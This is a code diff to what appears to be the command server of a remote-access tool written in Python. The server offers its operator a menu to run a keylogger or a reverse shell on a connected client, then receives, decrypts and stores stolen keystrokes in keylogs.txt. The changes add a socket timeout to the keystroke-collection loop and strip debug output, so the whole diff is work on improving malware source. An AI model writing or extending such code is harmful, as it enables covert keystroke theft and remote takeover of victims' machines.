@@ -53,22 +53,24 @@ class SecureServer:
                     with open("keylogs.txt", "r") as p:
                       logs = p.read()
                       print(logs) 
-                      print(f"{self.stop_logging}")
                     return
 
         threading.Thread(target=stop_listener, daemon=True).start()
+        
         
         if os.path.exists("keylogs.txt") or os.stat("keylogs.txt").st_size == 0:
           with open("keylogs.txt","w") as file:
             file.write("")
             file.flush()
+
         with open("keylogs.txt", "a") as keyLogs:
             while not self.stop_logging:
-                print(f"{self.stop_logging}")
-                data = client.recv(1024)
-                if not data:
-                    break
                 try:
+                    client.settimeout(2)
+                    data = client.recv(1024)
+                    if not data:
+                         break
+                
                     decrypted_data = self.cipher.decrypt(data).decode()
                     decrypted_data = str(decrypted_data).replace("'", "")
 
@@ -80,7 +82,10 @@ class SecureServer:
                         decrypted_data = ""
                     keyLogs.write(decrypted_data)
                     keyLogs.flush()
-
+                    
+                except socket.timeout:
+                    continue
+                    
                 except Exception as e:
                     print(f"Decryption failed: {e}")
                     break
@@ -106,12 +111,10 @@ class SecureServer:
         client, address = self.secure_server.accept()
         print(f"Secure connection from {address}")
         self.handle_client(client)
-        print("back in start_client")
         return
     
     def handle_client(self, client):
         while True:
-            print("in client")
             try:
                 # Send user choice to client
                 print("\n1) Keylogger\n2) Reverse Shell\n3) Exit")
@@ -131,8 +134,7 @@ class SecureServer:
                     client.close()
 
             except Exception as e:
-                print(f"Error: {e}")
-        print("out of while")        
+                print(f"Error: {e}")       
         return       
 
 # Flask route for encryption key retrieval
